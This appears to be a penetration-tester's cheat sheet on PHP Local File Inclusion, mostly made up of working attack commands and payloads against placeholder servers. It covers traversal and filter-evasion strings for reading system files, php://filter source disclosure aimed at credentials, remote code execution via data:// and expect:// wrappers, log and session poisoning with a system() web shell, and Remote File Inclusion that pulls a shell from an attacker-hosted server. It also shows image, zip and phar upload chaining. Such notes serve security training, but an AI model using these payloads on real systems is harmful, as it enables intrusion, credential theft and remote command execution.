# Local File Inclusion (LFI)
**Concept:** LFI occurs when an application takes user input (like a URL parameter) and passes it to a file inclusion function (e.g., `include()`, `require()` in PHP) without proper sanitization. 
**Impact:** Sensitive Data Exposure (Config files, Source Code) â†’ Remote Code Execution (RCE).
## 1. Reconnaissance (Detection)
**Goal:** Identify parameters that interact with the file system.
### Parameter Fuzzing
Use `ffuf` to identify parameters that might influence the page content or size. 
**Syntax:** `ffuf -w [Wordlist] -u [URL] -fs [FilterSize]`
```
# Fuzzing for parameters
ffuf -w /opt/useful/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287
```
### Basic Verification (The "Canary")
Attempt to load a known system file to verify the vulnerability. 
**Payload:** `/etc/passwd` (Linux) or `C:\Windows\win.ini` (Windows).
```http
http://<SERVER_IP>:<PORT>/index.php?language=/etc/passwd
```
## 2. Weaponization: Filter Evasion
**Goal:** Bypass input sanitization logic (e.g., stripping `../`) to reach the target file.

| **Technique**        | **Description**                                              | **Payload Example**              |
| -------------------- | ------------------------------------------------------------ | -------------------------------- |
| *Basic Traversal*  | Standard directory climbing.                                 | `../../../../etc/passwd`         |
| *Recursive Filter* | Bypasses `str_replace('../', '')` by nesting.                | `....//....//....//etc/passwd`   |
| *URL Encoding*     | Bypasses WAF/Input filters.                                  | `%2e%2e%2f%2e%2e%2fetc%2fpasswd` |
| *Path Truncation*  | Floods the path to truncate appended extensions (PHP < 5.3). | `..././././` (Repeat 2048 times) |
**Path Truncation Generator (Bash):**
```shell
echo -n "non_existing_directory/../../../etc/passwd/" && for i in {1..2048}; do echo -n "./"; done
```
## 3. Exploitation: Source Code Disclosure
**Goal:** Read the _source code_ of PHP files (like `config.php`) instead of executing them. 
**Mechanism:** PHP Wrappers (`php://filter`). This forces the server to treat the file as a stream and encode it (Base64) before rendering, preventing execution.

**Syntax:** `php://filter/read=convert.base64-encode/resource=[TargetFile]`
```shell
# 1. Request the file (e.g., config.php)
curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=config"

# 2. Decode the output
echo 'PD9waHAK...' | base64 -d
```
- **Intelligence:** Look for database credentials, API keys, or admin logic in the decoded source.
## 4. Remote Code Execution (RCE)
**Goal:** Elevate from file reading to command execution.
### Method A: PHP Wrappers (Data/Expect)
Inject PHP code directly into the stream.
- **`data://`**: Embeds code directly in the URL. 
- **`expect://`**: Executes system commands (Requires `expect` extension).
```shell
# Data Wrapper (Base64 encoded '<?php system($_GET["cmd"]); ?>')
curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id'

# Expect Wrapper
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```
### Method B: Log Poisoning (Apache/Nginx)
**Concept:** Inject PHP code into server logs (User-Agent header), then include the log file via LFI to execute the code. 
**Prerequisite:** The web user (e.g., `www-data`) must have read access to logs.

**1. Verify Access:**
```http
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

**2. Poison the Log:** Inject a PHP shell into the User-Agent.
```shell
curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system(\$_GET['cmd']); ?>"
```

**3. Execute:**
```shell
curl "http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id"
```
**OPSEC Warning:** This bloats the log file and is easily detectable by SIEMs.
### Method C: Session Poisoning
**Concept:** Inject PHP code into a session variable, then include the session file. 
**Path:** `/var/lib/php/sessions/sess_<PHPSESSID>`

1. **Check Cookie:** Get your `PHPSESSID` (e.g., `nhhv8...`).    
2. **Poison:** If any page lets you modify session data (e.g., Login username, Language selection), enter `<?php system($_GET['cmd']); ?>`.
3. **Execute:**
```http
?language=/var/lib/php/sessions/sess_nhhv8...&cmd=id
```
## 5. Remote File Inclusion (RFI)
**Concept:** Including a file hosted on _your_ attacker machine. 
**Prerequisite:** `allow_url_include = On` in `php.ini`.
### Payload Delivery (HTTP/FTP/SMB)
**1. Setup Listener (Attacker):**
```shell
# Create shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
# Host via HTTP
sudo python3 -m http.server 80
# OR Host via FTP
sudo python -m pyftpdlib -p 21
# OR Host via SMB (Windows Targets)
impacket-smbserver -smb2support share $(pwd)
```

**2. Execute Inclusion:**
```http
# HTTP
?language=http://<OUR_IP>/shell.php&cmd=id

# FTP
?language=ftp://<OUR_IP>/shell.php&cmd=id

# SMB (UNC Path - Windows Only)
?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```
## 6. Lateral Movement: File Upload Chaining
**Concept:** If you can upload a file (Profile Image, Zip), but it doesn't execute (e.g., non-executable extension), use LFI to force execution.
### GIF/Image Upload (Magic Bytes)
Bypass image filters by adding GIF headers.
```shell
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
- **Attack:** Upload `shell.gif`, find the path, include it via LFI.
### ZIP Wrapper (`zip://`)
Upload a Zip containing the shell, keep the `.jpg` extension.
```shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php
```
- **Attack:** `?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`
- _Note:_ `%23` is the URL encoded `#` (fragment identifier).
### Phar Wrapper (`phar://`)
Used to bypass advanced filters. Pack the shell into a `.phar` archive and rename to `.jpg`. **Attack:** `?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`